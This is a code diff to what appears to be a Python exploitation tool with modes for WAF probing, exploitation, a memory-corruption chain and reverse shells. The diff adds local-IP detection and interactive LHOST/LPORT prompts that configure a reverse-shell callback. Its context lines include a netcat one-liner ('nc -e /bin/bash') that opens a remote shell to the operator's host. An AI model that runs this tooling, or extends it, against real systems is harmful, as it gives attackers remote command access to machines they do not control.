@@ -580,6 +580,20 @@ def generate_reverse_shell_cmd(lhost: str, lport: int) -> str:
         f"nc -e /bin/bash {lhost} {lport} || nc -e /bin/sh {lhost} {lport}"
     )
 
+def get_local_ip() -> str:
+    """Attempt to detect local IP address for reverse shell listener."""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        try:
+            return socket.gethostbyname(socket.gethostname())
+        except Exception:
+            return "127.0.0.1"
+
 # ---------------------------------------------------------------------------
 # RAW HTTP TRANSPORT FOR BINARY MEMORY CORRUPTION CHAIN
 # ---------------------------------------------------------------------------
@@ -1802,6 +1816,25 @@ def main() -> int:
     do_waf = args.run_all or args.waf
     do_exploit = args.run_all or args.exploit or args.shell or bool(args.lhost) or args.reverse
     do_shell = args.shell
+
+    # Prompt user for LHOST / LPORT if reverse shell is requested but LHOST was not supplied
+    if args.reverse or bool(args.lhost):
+        if not args.lhost:
+            auto_ip = get_local_ip()
+            if sys.stdin.isatty() and not args.json:
+                print(f"{Fore.YELLOW}[!] Reverse shell requested, but --lhost was not specified.{Style.RESET_ALL}")
+                try:
+                    user_ip = input(f"{Fore.CYAN}[?] Enter LHOST IP for reverse callback [{auto_ip}]: {Style.RESET_ALL}").strip()
+                    args.lhost = user_ip or auto_ip
+                    user_port = input(f"{Fore.CYAN}[?] Enter LPORT [{args.lport}]: {Style.RESET_ALL}").strip()
+                    if user_port.isdigit():
+                        args.lport = int(user_port)
+                except (KeyboardInterrupt, EOFError):
+                    args.lhost = auto_ip
+            else:
+                args.lhost = auto_ip
+            if not args.json:
+                print(f"{Fore.GREEN}[+] Configured reverse shell target -> {args.lhost}:{args.lport}{Style.RESET_ALL}")
 
     # Load and merge endpoint wordlist (built-in + optional remote SecLists + user file)
     active_wordlist = load_custom_wordlist(
